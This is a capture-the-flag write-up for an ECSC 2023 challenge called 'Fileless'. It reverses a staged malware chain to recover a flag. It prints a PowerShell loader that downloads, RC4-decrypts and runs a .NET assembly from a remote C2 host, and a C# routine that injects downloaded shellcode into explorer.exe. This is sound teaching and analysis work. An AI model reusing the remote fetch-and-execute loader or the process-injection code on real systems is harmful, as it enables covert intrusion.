# Fileless

> I have downloaded a funny cat picture. But I can't open it. And my computer behaves weirdly. Can you help me?
>
> _The challenge was tested on Windows 10. It may or may not work on another systems.
If something crashes - reverse harder, the task is still solvable._
>
> [funny-cat.gif.lnk](https://hack.cert.pl/files/funny-cat-4c9880d58c9ae5620082faa7249362c5d1ee04d9.gif.lnk) 1.8 KB

## .lnk file
With `hexdump -C` it's possible to find a PoweShell script which sets `$C2` variable to `fileless.ecsc23.hack.cert.pl:5060` and then executes a script downloaded from `http://$C2/ywHcw88t9ExkgtCj2lUO`. This script then decodes a base64-encoded blob and xors it with a key to get and execute the 1st stage of the program.

## Stage 1 (and `token.txt`)
The first stage (with whitespaces added for readability) looks like this:
```ps
$E = [System.Text.Encoding]::ASCII;
$K = $E.GetBytes('zHsqz5LbhQuqcWQmJvRW');
$R = {
	$D, $K = $Args;
	$i = 0;
	$S = 0..255;
	0..255 | %{
		$J = ($J + $S[$_] + $K[$_ % $K.Length]) % 256;
		$S[$_], $S[$J] = $S[$J], $S[$_]
	};
	$D | %{
		$I = ($I + 1) % 256;
		$H = ($H + $S[$I]) % 256;
		$S[$I], $S[$H] = $S[$H], $S[$I];
		$_ -bxor $S[($S[$I] + $S[$H]) % 256]
	}
}

if ((compare-object
    (& $R $E.GetBytes((Get-Content "C:\\Users\\Public\\Documents\\token.txt")) $K)
    ([System.Convert]::FromBase64String("FxxGrgbb/w=="))
)) {
	Exit
}

[System.Reflection.Assembly]::Load([byte[]](& $R (Invoke-WebRequest "http://$C2/O4vg7tmRa8fOCYGQH9U5" -UseBasicParsing).Content $K))
	.GetType('E.C')
	.GetMethod('SC', [Reflection.BindingFlags] 'Static, Public, NonPublic')
	.Invoke($null, [object[]]@($C2))
```
The code block stored as `$R` is clearly an implementation of RC4, which is self-inverse. Hence, running
```ps
> $E.GetString((& $R ([System.Convert]::FromBase64String("FxxGrgbb/w==")) $K))
Boz3nka
```
returns the expected content of `token.txt`.

The final part of this script fetches data from the C2, decrypts it using `$R` and `$K`, loads it as a .NET assembly and runs a function from it. The assembly can be easily downloaded and saved to a file using:
```ps
> $asm = [System.Reflection.Assembly]::Load([byte[]](& $R (Invoke-WebRequest "http://$C2/O4vg7tmRa8fOCYGQH9U5" -UseBasicParsing).Content $K))
> $f = $asm.GetType().GetMethod("GetRawBytes", [Reflection.BindingFlags] "Instance, NonPublic")
> Set-Content -Value $f.Invoke($asm, $null) -Encoding Byte stage2.exe
```
(Note: it's necessary to use reflections to call `GetRawBytes` on `$asm`, because it's a private method.)

## Stage 2 (and `credentials.txt`)
Now it's possible to inspect `stage2.exe` created in the previous step using a .NET decompiler (e.g. ILSpy). The method invoked in the 1st stage is `E.C.SC`, which has the following code:
```cs
// E.C
using [...];

public static void SC(string c2)
{
	string s = File.ReadAllText("C:\\Users\\Public\\Documents\\credentials.txt");
	byte[] bytes = Encoding.ASCII.GetBytes(s);
	if (!Enumerable.SequenceEqual(second: Convert.FromBase64String("uOWIiZv8ed7f"), first: Bop(bytes)))
	{
		Process.GetCurrentProcess().Kill();
	}
	Str(Convert.FromBase64String("s/6mq5GxZ8HKJ91JN/3P7dd5auOx62xRLiBZPbCIut7hEwF3oB2+11x8"));
	Fun(new HttpClient().GetAsync("http://" + c2 + "/" + PATH).Result.Content.ReadAsByteArrayAsync().Result);
}
```
Content of `credentials.txt` is passed through `Bop` method and compared with a hard-encoded value. The `Bop` method is:
```cs
// E.C
public static byte[] Bop(byte[] data)
{
	byte[] array = new byte[data.Length];
	byte[] array2 = Ks(data.Length, ECSC);
	for (int i = 0; i < data.Length; i++)
	{
		array[i] = (byte)(array2[i] ^ data[i]);
	}
	return array;
}
```
Since it uses xor (which is self-inverse) on consecutive bytes to calculate the ciphertext, we can calculate the expected contents of `credentials.txt` using the following commands in PowerShell (assuming that variables from the previous stage are still set):
```ps
> $bop = $asm.GetType("E.C").GetMethod("Bop", [Reflection.BindingFlags] "Static, Public")
> $E.GetString($bop.Invoke($null, @(,[System.Convert]::FromBase64String("uOWIiZv8ed7f"))))
coZR0b1sz
```

The 3rd stage is run by downloading data from the `C2` from a path specified by the `PATH` static variable and passing it to `Fun` method:
```cs
// E.C
using System;
using System.Diagnostics;

private static void Fun(byte[] buf)
{
	Process process = Process.GetProcessesByName("explorer")[0];
	IntPtr hProcess = OpenProcess(2035711u, bInheritHandle: false, process.Id);
	IntPtr intPtr = VirtualAllocEx(hProcess, IntPtr.Zero, 4096u, 12288u, 64u);
	WriteProcessMemory(hProcess, intPtr, buf, buf.Length, out var _);
	CreateRemoteThread(hProcess, IntPtr.Zero, 0u, intPtr, IntPtr.Zero, 0u, IntPtr.Zero);
}
```
This method allocates a buffer in the `explorer` process, fills it with the data downloaded from the C2, and runs it as a remote thread. Hence, the data should be a flat binary which contains a procedure called as the 3rd stage of the challenge. This data can be saved with the following PowerShell command:
```ps
> $s3 = (Invoke-WebRequest "http://$C2/$($asm.GetType('E.C').GetField('PATH').GetValue($null))" -UseBasicParsing).Content
> Set-Content -Value $s3 -Encoding Byte stage3.bin
```

## Stage 3 (and `wallet.txt`)
First, disassemble `stage3.bin` created in the previous step (for this, I'm using a Linux utility `objdump`):
```sh
$ objdump -D -m i386 -Mintel,x86-64 -b binary stage3.bin > stage3.asm
```
Now, the following can be deduced (all "absolute" addresses are the addresses set by `objdump`, which are relative to the beginning of the code):
- In the "main" procedure (the one starting at the top of the file), some local variables are set:
    - string `C:\Users\Public\Documents\token.txt` at `[rbp+0x850]`
    - string `C:\Users\Public\Documents\credentials.txt` at `[rbp+0x820]`
    - string `C:\Users\Public\Documents\wallet.txt` at `[rbp+0x7f0]`
    - wide-char string `user32` at `[rbp+0x7e2]`
    - wide-char string `kernel32` at `[rbp+0x7d0]`
    - string `CreateFileA` at `[rbp+0x7c4]`
    - string `LoadLibraryW` at `[rbp+0x7b7]`
    - string `ReadFile` at `[rbp+0x7ae]`
    - string `ExitProcess` at `[rbp+0x7a2]`
    - string `MessageBoxA` at `[rbp+0x796]`
    - string `Congratulations` at `[rbp+0x780]`
- The procedure at `0x60f` is called twice, each time with `kernel32` as a single argument; it probably loads a DLL
- The procedure at `0x42f` is called several times with 2 arguments, 1st being a value returned from `0x60f` or `LoadLibraryW`, 2nd being a function name; it probably loads a function from a DLL
- The procedure at `0x6a9` reads a file from a path specified in the 1st argument and copies its content to a buffer passed in the 2nd argument
- The procedure at `0x7aa` checks whether the content of `wallet.txt` is correct:
    - each character code from the only argument is increased by 10 and then compared with a corresponding character code from the string `xk7k~>u7KZ^`
    - therefore the expected input is `na-at4k-APT`
- Finally, in the "main" procedure, a buffer at `[rbp+0x8a8]` is filled with `ecsc23{` and contents of the files `token.txt`, `credentials.txt` and `wallet.txt` separated by `-`

## Flag
`ecsc23{Boz3nka-coZR0b1sz-na-at4k-APT}`